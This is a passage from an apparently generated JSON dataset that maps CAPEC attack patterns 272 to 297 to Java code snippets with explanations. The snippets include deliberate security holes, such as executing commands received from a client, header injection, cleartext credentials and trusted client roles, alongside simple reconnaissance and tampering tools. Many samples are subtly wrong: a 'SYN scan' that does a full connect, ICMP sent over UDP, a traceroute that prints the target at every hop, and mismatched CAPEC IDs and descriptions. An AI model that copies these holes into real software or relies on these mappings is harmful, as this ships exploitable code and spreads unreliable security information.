        "capec_name": "Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"AUTH user:password\");\n\n            // Read the server's response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a communication protocol. The code establishes a socket connection to a server at 'example.com' on port 8080 and sends an authentication message ('AUTH user:password') without verifying the source of the communication channel (CWE-940). Additionally, it does not ensure the integrity of the message during transmission (CWE-924), making it susceptible to capture-replay attacks (CWE-294). The code also lacks proper destination specification (CWE-941), and the simple authentication protocol is vulnerable to reflection attacks (CWE-301). This example embodies the main idea of CAPEC-272 (Protocol Manipulation) by highlighting how improper handling of communication protocols can lead to various security vulnerabilities."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-444: Inconsistent Interpretation of HTTP Requests\n        response.setHeader(\"X-User-Input\", userInput);\n        \n        // CWE-436: Interpretation Conflict\n        // CWE-433: Unparsed Raw Web Content Delivery\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Response</h1>\");\n        out.println(\"<p>\" + userInput + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to HTTP Response Smuggling. The servlet takes user input from an HTTP POST request and directly sets it as a header in the HTTP response without proper sanitization. This can lead to HTTP Response Splitting (CWE-113) if the user input contains CRLF sequences, allowing an attacker to inject additional headers or even entire HTTP responses. The code also illustrates improper neutralization of special elements (CWE-74) and inconsistent interpretation of HTTP requests (CWE-444), as different components may handle the injected content differently. Additionally, the servlet outputs raw user input in the HTML response, which can lead to further security issues (CWE-433, CWE-436)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VerbTamperingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process GET request\n        response.getWriter().write(\"GET request processed\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process POST request\n        response.getWriter().write(\"POST request processed\");\n    }\n\n    @Override\n    protected void service(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String method = request.getMethod();\n        if (method.equals(\"GET\") || method.equals(\"POST\")) {\n            super.service(request, response);\n        } else {\n            // Improper handling of other HTTP verbs\n            response.getWriter().write(\"Unsupported HTTP method: \" + method);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to HTTP Verb Tampering. The `service` method checks if the HTTP method is either GET or POST and processes the request accordingly. However, it does not properly handle other HTTP verbs, allowing an attacker to potentially bypass access restrictions by using unsupported or unexpected HTTP methods. This code snippet embodies the main idea of CAPEC-274 (HTTP Verb Tampering) and highlights CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the HTTP method for access control. Additionally, it touches on CWE-302 (Authentication Bypass by Assumed-Immutable Data) as it assumes the HTTP method is immutable and trustworthy."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSRebindingExample {\n    public static void main(String[] args) throws Exception {\n        String maliciousDomain = \"malicious.example.com\";\n        String targetInternalIP = \"192.168.1.100\";\n\n        // Initial DNS resolution\n        InetAddress initialAddress = InetAddress.getByName(maliciousDomain);\n        System.out.println(\"Initial IP: \" + initialAddress.getHostAddress());\n\n        // Simulate DNS rebinding by changing the IP address\n        // In a real attack, this would be done by the attacker's DNS server\n        // Here we simulate it by directly setting the target IP\n        InetAddress targetAddress = InetAddress.getByName(targetInternalIP);\n        System.out.println(\"Rebound IP: \" + targetAddress.getHostAddress());\n\n        // Attempt to connect to the internal IP\n        Socket socket = new Socket(targetAddress, 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Send HTTP request to the internal IP\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: \" + maliciousDomain);\n        out.println(\"\");\n\n        // Read and print the response\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n\n        // Close resources\n        out.close();\n        in.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS Rebinding attack. Initially, the code resolves a malicious domain to an IP address controlled by the attacker. The attacker then changes the DNS resolution to an internal IP address within the target organization. The code simulates this by directly setting the target IP. Finally, it attempts to connect to the internal IP and sends an HTTP request, allowing the attacker to interact with internal services. This example highlights the vulnerability of relying on DNS for security-critical actions (CWE-350) and the risks associated with binding to unrestricted IP addresses (CWE-1327)."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedMessage = in.readLine();\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            System.out.println(\"Received: \" + receivedMessage);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            if (receivedMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // CWE-707: Improper Neutralization\n            String command = in.readLine();\n            Runtime.getRuntime().exec(command); // Potentially dangerous command execution\n\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable inter-component protocol communication between a server and a client. The server listens on port 8080 and accepts incoming connections. It reads messages from the client in cleartext (CWE-319), which can be intercepted by unauthorized actors. The server does not verify the integrity of the received messages (CWE-924), allowing potential tampering during transmission. Additionally, the server executes commands received from the client without proper neutralization (CWE-707), leading to potential command injection vulnerabilities. This code embodies the main idea of CAPEC-272 by showcasing how improper handling of inter-component protocols can lead to various security issues."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<user><id>123</id><role>admin</role></user>\";\n        parseXML(xmlData);\n    }\n\n    public static void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n\n            String userId = document.getElementsByTagName(\"id\").item(0).getTextContent();\n            String userRole = document.getElementsByTagName(\"role\").item(0).getTextContent();\n\n            // CWE-302: Authentication Bypass by Assumed-Immutable Data\n            if (userRole.equals(\"admin\")) {\n                System.out.println(\"User \" + userId + \" is an admin.\");\n            } else {\n                System.out.println(\"User \" + userId + \" is not an admin.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that embodies the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code parses an XML string containing user information, including an ID and a role. The vulnerability lies in the assumption that the 'role' field is immutable and trustworthy (CWE-302: Authentication Bypass by Assumed-Immutable Data). An attacker could manipulate the XML data to gain unauthorized access by changing the 'role' to 'admin'. The code does not validate or sanitize the input, making it susceptible to various attacks, including impersonation and unauthorized access."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class WebServiceProtocolManipulation {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://webservice.example.com/\\\"><soapenv:Header/><soapenv:Body><web:restrictedFunction><web:param>maliciousValue</web:param></web:restrictedFunction></soapenv:Body></soapenv:Envelope>\";\n\n        // Simulate sending the malicious SOAP message\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new ByteArrayInputStream(maliciousSOAPMessage.getBytes()));\n        SOAPConnectionFactory soapConnectionFactory = SOAPConnectionFactory.newInstance();\n        SOAPConnection soapConnection = soapConnectionFactory.createConnection();\n\n        // Send the message to the web service\n        String url = \"http://webservice.example.com/service\";\n        SOAPMessage response = soapConnection.call(message, url);\n\n        // Print the response\n        System.out.println(\"Response: \" + response.getSOAPBody().getTextContent());\n\n        soapConnection.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a web service protocol manipulation attack. The code constructs a malicious SOAP message that calls a restricted function with an unexpected parameter value. The SOAP message is then sent to a web service endpoint. This example embodies the CAPEC concept by manipulating the web service protocol to invoke a function that should normally be restricted, potentially leading to unauthorized access or service disruption. The code also highlights CWE-707 (Improper Neutralization) as it does not validate the SOAP message, CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to enforce security, and CWE-573 (Improper Following of Specification by Caller) by not adhering to the expected protocol specifications."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class SOAPManipulationExample {\n    public static void main(String[] args) throws Exception {\n        String soapMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:login>\"\n                + \"<username>admin</username>\"\n                + \"<password>password</password>\"\n                + \"</web:login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        // Simulate SOAP message manipulation\n        soapMessage = soapMessage.replace(\"<username>admin</username>\", \"<username>attacker</username>\");\n\n        // Parse the manipulated SOAP message\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage(null, new ByteArrayInputStream(soapMessage.getBytes()));\n\n        // Process the SOAP message (vulnerable to manipulation)\n        SOAPBody body = message.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) body.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        // Print the extracted credentials\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP message manipulation vulnerability. The code constructs a SOAP message containing login credentials, then simulates an attack by modifying the username field in the SOAP message. The manipulated message is parsed and processed without any validation, leading to the extraction and printing of the manipulated credentials. This example highlights the risks associated with improper neutralization of SOAP parameters (CWE-707), client-side enforcement of server-side security (CWE-602), and improper restriction of XML external entity references (CWE-611)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\nimport java.nio.charset.StandardCharsets;\n\npublic class SOAPParameterTampering {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservice\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<web:username>admin</web:username>\"\n                + \"<web:password>password</web:password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage soapMessage = messageFactory.createMessage(null, new ByteArrayInputStream(maliciousSOAPMessage.getBytes(StandardCharsets.UTF_8)));\n\n        // Simulate processing the SOAP message\n        SOAPBody soapBody = soapMessage.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) soapBody.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"web:username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"web:password\").item(0).getTextContent();\n\n        // Vulnerable code: directly using the tampered parameters\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful for user: \" + username);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + username);\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP parameter tampering vulnerability. The code constructs a SOAP message with hardcoded credentials and processes it without proper validation. The `authenticate` method is called with the tampered parameters, leading to potential authentication bypass. This example highlights the risk of SOAP manipulation (CAPEC-279) and related weaknesses such as CWE-294 (Authentication Bypass by Capture-replay) and CWE-651 (Exposure of WSDL File Containing Sensitive Information). The code shows how an attacker could craft a malicious SOAP message to exploit these vulnerabilities."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class PingTest {\n    public static void main(String[] args) {\n        String ipAddress = \"192.168.1.1\"; // Target IP address\n        try {\n            InetAddress inet = InetAddress.getByName(ipAddress);\n            if (inet.isReachable(5000)) { // Timeout in milliseconds\n                System.out.println(ipAddress + \" is reachable.\");\n            } else {\n                System.out.println(ipAddress + \" is not reachable.\");\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"Host unknown: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"IO Exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple ICMP Echo Request (Ping) to check if a target system is responsive. The code uses Java's InetAddress class to send an ICMP Echo Request to the specified IP address and waits for a response. If the target system responds within the specified timeout (5000 milliseconds), it prints that the IP address is reachable; otherwise, it prints that the IP address is not reachable.\n\nThe code embodies the main idea of the CAPEC by performing a Ping operation to determine if a target system is alive. It also touches on related CWEs by potentially exposing sensitive information (CWE-200) about the network's structure and the presence of active hosts. Additionally, the cleartext nature of ICMP packets (CWE-319) means that this information could be intercepted by unauthorized actors. The code does not include any protection mechanisms to prevent such exposure, highlighting the vulnerabilities associated with improper handling of network diagnostics."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress inet = InetAddress.getByName(target);\n            Socket socket = new Socket(inet, port);\n            System.out.println(\"Port \" + port + \" is open on \" + target);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP SYN scan to check if a specific port (port 80) on a target IP address (192.168.1.1) is open. The code attempts to create a socket connection to the target IP and port. If the connection is successful, it prints that the port is open; otherwise, it prints that the port is closed. This embodies the main idea of the CAPEC 'TCP SYN Scan' by showing how an adversary might determine the status of ports on a remote target. The code also indirectly touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by potentially revealing open ports, and 'Excessive Attack Surface' (CWE-1125) by scanning multiple ports."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class PingReplayAttack {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingReplayAttack <target IP>\");\n            return;\n        }\n\n        String targetIP = args[0];\n        byte[] icmpPacket = createICMPPacket();\n\n        // Send ICMP Echo Request\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(icmpPacket, icmpPacket.length, InetAddress.getByName(targetIP), 0);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request sent to \" + targetIP);\n\n        // Capture and replay the ICMP Echo Request\n        socket.receive(packet);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request replayed to \" + targetIP);\n\n        socket.close();\n    }\n\n    private static byte[] createICMPPacket() {\n        byte[] packet = new byte[28];\n        packet[0] = 8; // Type: Echo (ping) request\n        packet[1] = 0; // Code: 0\n        // Checksum, Identifier, Sequence Number, and Data can be set as needed\n        return packet;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Echo Request (ping) replay attack. The program sends an ICMP Echo Request to a specified target IP address and then captures and replays the same packet back to the target. This embodies the main idea of the deprecated CAPEC-285, which involves using ICMP Echo Requests for malicious purposes. The code also touches on CWE-294 (Authentication Bypass by Capture-replay) by showing how a captured packet can be replayed to potentially bypass security mechanisms. Note that this code is for educational purposes only and should not be used for malicious activities."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    private static Map<String, String> protectedData = new HashMap<>();\n    private static Map<String, String> unprotectedData = new HashMap<>();\n\n    static {\n        // Initialize protected data\n        protectedData.put(\"adminPassword\", \"superSecret\");\n        // Initialize unprotected data\n        unprotectedData.put(\"publicInfo\", \"This is public\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate an overlap in address map\n        String key = \"adminPassword\";\n        if (unprotectedData.containsKey(key)) {\n            System.out.println(\"Accessing protected data through unprotected map: \" + unprotectedData.get(key));\n        } else {\n            System.out.println(\"Accessing protected data directly: \" + protectedData.get(key));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where protected and unprotected data regions overlap, allowing an attacker to access protected data through an unprotected map. The `protectedData` map contains sensitive information, while the `unprotectedData` map is meant for public information. The code checks if a key exists in the unprotected map and accesses it, potentially exposing protected data if the key overlaps. This represents the idea of 'Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges' (CWE-1316) and indirectly touches on the concept of 'Creation of Emergent Resource' (CWE-1229) by creating an unintended access path."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.Attributes;\nimport java.util.Hashtable;\n\npublic class MXRecordEnumeration {\n    public static void main(String[] args) {\n        String domain = \"example.com\";\n        try {\n            Hashtable<String, String> env = new Hashtable<>();\n            env.put(\"java.naming.factory.initial\", \"com.sun.jndi.dns.DnsContextFactory\");\n            DirContext ctx = new InitialDirContext(env);\n            Attributes attrs = ctx.getAttributes(domain, new String[]{\"MX\"});\n            System.out.println(\"MX Records for domain: \" + domain);\n            attrs.getAll().asIterator().forEachRemaining(attr -> {\n                System.out.println(attr);\n                try {\n                    String mxRecord = attr.toString().split(\" \")[1];\n                    InetAddress inetAddress = InetAddress.getByName(mxRecord);\n                    System.out.println(\"Resolved IP: \" + inetAddress.getHostAddress());\n                } catch (UnknownHostException e) {\n                    System.err.println(\"Failed to resolve MX record to IP\");\n                }\n            });\n        } catch (Exception e) {\n            System.err.println(\"Failed to enumerate MX records\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using DNS queries. The code uses Java's JNDI (Java Naming and Directory Interface) to query DNS for MX records of the specified domain. For each MX record found, it attempts to resolve the hostname to an IP address. This process can potentially expose sensitive information, such as internal IP addresses or firewall IPs, which aligns with the CAPEC description. The code also touches on related CWEs by showing how sensitive information (MX records and resolved IPs) can be exposed (CWE-200), and how reliance on DNS resolution can be problematic (CWE-350)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        String dnsServer = \"example.com\";\n        String zone = \"example.com\";\n        try {\n            // Perform a DNS zone transfer\n            Socket socket = new Socket(dnsServer, 53);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a request for a zone transfer\n            out.println(\"AXFR \" + zone);\n\n            // Read the response\n            String response;\n            while ((response = in.readLine()) != null) {\n                System.out.println(response);\n            }\n\n            // Close the connections\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS zone transfer request to a DNS server. The code attempts to connect to a DNS server on port 53 and requests a zone transfer for the specified domain. If the DNS server is misconfigured to allow zone transfers, it will return a list of IP addresses and hostnames within the zone. This can expose sensitive information about the network topology, including internal servers and their roles. The code embodies the main idea of CAPEC-200: DNS Zone Transfers, and highlights the potential exposure of sensitive information (CWE-200) due to misconfiguration. It also touches on the reliance on DNS for security decisions (CWE-350) by showing how DNS information can be misused."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        String subnet = \"192.168.1.\";\n        int timeout = 1000;\n        for (int i = 1; i < 255; i++) {\n            String host = subnet + i;\n            try {\n                if (InetAddress.getByName(host).isReachable(timeout)) {\n                    System.out.println(host + \" is reachable\");\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet performs a basic host discovery (ping sweep) on a subnet (192.168.1.x). It iterates through IP addresses from 192.168.1.1 to 192.168.1.254 and checks if each host is reachable within a 1000ms timeout. If a host is reachable, it prints the IP address to the console. This code embodies the main idea of CAPEC-309 (Host Discovery) by attempting to identify live hosts on a network. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) by revealing which hosts are alive, and it uses cleartext transmission (CWE-319) since the reachability check does not encrypt the communication. Additionally, it does not authenticate the host (CWE-291) and relies on IP addresses for identification."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class Traceroute {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java Traceroute <hostname>\");\n            return;\n        }\n\n        String target = args[0];\n        int maxHops = 30;\n        int timeout = 3000;\n\n        for (int ttl = 1; ttl <= maxHops; ttl++) {\n            try {\n                Process trace = Runtime.getRuntime().exec(\"ping -c 1 -t \" + ttl + \" \" + target);\n                trace.waitFor();\n                InetAddress address = InetAddress.getByName(target);\n                System.out.println(\"Hop \" + ttl + \": \" + address.getHostAddress());\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + target);\n                break;\n            } catch (InterruptedException e) {\n                System.out.println(\"Traceroute interrupted\");\n                break;\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple traceroute utility that maps out the route data flows through the network to a target destination. The code uses the 'ping' command with incrementing TTL (Time-to-Live) values to identify each hop along the route. This approach can expose sensitive information about the network topology to unauthorized actors, aligning with the CAPEC description. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and transmitting data in cleartext (CWE-319). The code is vulnerable as it does not secure the information being transmitted or received, and it does not handle sensitive data properly."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) throws IOException {\n        InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n        byte[] icmpRequest = new byte[8];\n        icmpRequest[0] = 17; // ICMP Type 17 (Address Mask Request)\n        icmpRequest[1] = 0;  // Code\n        icmpRequest[2] = 0;  // Checksum (not calculated for simplicity)\n        icmpRequest[3] = 0;  // Checksum\n        icmpRequest[4] = 0;  // Identifier\n        icmpRequest[5] = 0;  // Identifier\n        icmpRequest[6] = 0;  // Sequence Number\n        icmpRequest[7] = 0;  // Sequence Number\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(icmpRequest, icmpRequest.length, target, 0);\n        socket.send(packet);\n\n        byte[] buffer = new byte[1024];\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        System.out.println(\"Received ICMP Address Mask Reply from: \" + response.getAddress().getHostAddress());\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Type 17 Address Mask Request to a target IP address (192.168.1.1) to gather information about the target's networking configuration. The code constructs an ICMP Address Mask Request packet and sends it to the target. It then waits for an ICMP Address Mask Reply (Type 18) and prints the source address of the reply. This action can expose sensitive network information, such as subnet masks and default gateways, to unauthorized actors, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also highlights potential weaknesses like CWE-291 (Reliance on IP Address for Authentication) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), as it does not verify the authenticity of the response."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/timestamp\")\npublic class TimestampServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if (sensitiveData != null) {\n            response.getWriter().println(\"Sensitive Data: \" + sensitiveData);\n        }\n        \n        // Return the current timestamp\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss.SSS\");\n        String timestamp = sdf.format(new Date());\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        out.println(\"Current Timestamp: \" + timestamp);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable implementation that exposes the current timestamp of the server. The servlet processes GET requests and includes sensitive information in the query string (CWE-598). If the 'sensitiveData' parameter is present, it is printed in the response, exposing sensitive information to unauthorized actors (CWE-200). The servlet also returns the current timestamp, which can be exploited by an attacker to infer system behavior and potentially attack time-based security mechanisms, aligning with the 'Timestamp Request' CAPEC. This code snippet highlights the risks associated with exposing sensitive information and timestamps through web requests."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ICMPInformationRequest {\n    public static void main(String[] args) {\n        try {\n            String host = \"192.168.1.1\";\n            InetAddress inet = InetAddress.getByName(host);\n            if (inet.isReachable(5000)) {\n                System.out.println(\"Host is reachable\");\n            } else {\n                System.out.println(\"Host is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"Host unknown\");\n        } catch (IOException e) {\n            System.err.println(\"Network error\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP Information Request to check if a host is reachable. The code uses the `InetAddress` class to send an ICMP request to the specified host. If the host responds within the timeout period, it prints 'Host is reachable'; otherwise, it prints 'Host is not reachable'. This represents the CAPEC concept of sending ICMP Information Requests to determine if a host will respond to this deprecated mechanism. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing network reachability information to unauthorized actors."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckPing {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TCPAckPing <host>\");\n            return;\n        }\n\n        String host = args[0];\n        try {\n            InetAddress inetAddress = InetAddress.getByName(host);\n            // Attempt to create a socket to the host on a common port (e.g., 80)\n            try (Socket socket = new Socket(inetAddress, 80)) {\n                System.out.println(\"Host is alive\");\n            } catch (IOException e) {\n                System.out.println(\"Host is not responding\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        }\n    }\n}\n",
